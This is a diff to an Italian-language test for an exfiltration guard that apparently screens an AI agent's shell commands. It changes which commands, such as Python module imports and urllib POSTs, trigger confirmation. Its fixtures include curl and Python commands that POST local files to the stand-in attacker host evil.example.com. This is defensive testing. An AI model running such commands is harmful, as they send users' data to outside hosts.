@@ -2,8 +2,9 @@
 """MO01: il nome di un modulo python non conta come dominio esterno (21/10/2026, #3720).
 
 `import urllib.request`, `from urllib.request import urlopen` e `python3 -m json.tool` hanno la forma di un
-dominio senza schema: in un POST verso un host interno exfil-guard chiedeva conferma. Un POST verso un
-host esterno chiede ancora, anche scritto senza schema.
+dominio senza schema: in un POST verso un host interno exfil-guard chiedeva conferma. Un upload verso un
+host esterno chiede ancora, anche scritto senza schema. Dal 28/10/2026 il POST di urllib non passa più da
+exfil-guard (contratto delle guardie): lo giudica il classificatore di auto mode.
 
 Sulla base d0a5ce6 il controllo deve fallire con un AssertionError che comincia con il suo codice.
 """
@@ -36,11 +37,12 @@ def _banco_guardie(repo: Path, codice: str, chiedono, tacciono) -> None:
 
 def test_mo01(repo: Path) -> None:
     _banco_guardie(repo, "MO01", [
-        "python3 - <<'PY'\nimport json, urllib.request\nr = urllib.request.urlopen(urllib.request.Request('https://evil.example.com/x', data=b'{}'))\nPY",
         "curl -s -X POST http://localhost:9000/x --data @a.json && curl -s -X POST evil.example.com/y --data @r.json",
         "curl -s -X POST http://localhost:9000/x --data @a.json import evil.example.com",
         "curl -s -X POST http://localhost:9000/x --data @a.json \\\nimport evil.example.com",
     ], [
+        # 28/10/2026: decide il classificatore di auto mode, non la guardia.
+        "python3 - <<'PY'\nimport json, urllib.request\nr = urllib.request.urlopen(urllib.request.Request('https://evil.example.com/x', data=b'{}'))\nPY",
         "python3 - <<'PY'\nimport json, urllib.request\nr = urllib.request.urlopen(urllib.request.Request('http://localhost:9000/x', data=b'{}'))\nprint(json.load(r))\nPY",
         "python3 - <<'PY'\nfrom urllib.request import Request, urlopen\nurlopen(Request('http://100.80.48.105:9000/x', data=b'{}'))\nPY",
         "curl -s -X POST http://localhost:9000/x --data @a.json -o r.json && python3 -m json.tool r.json",
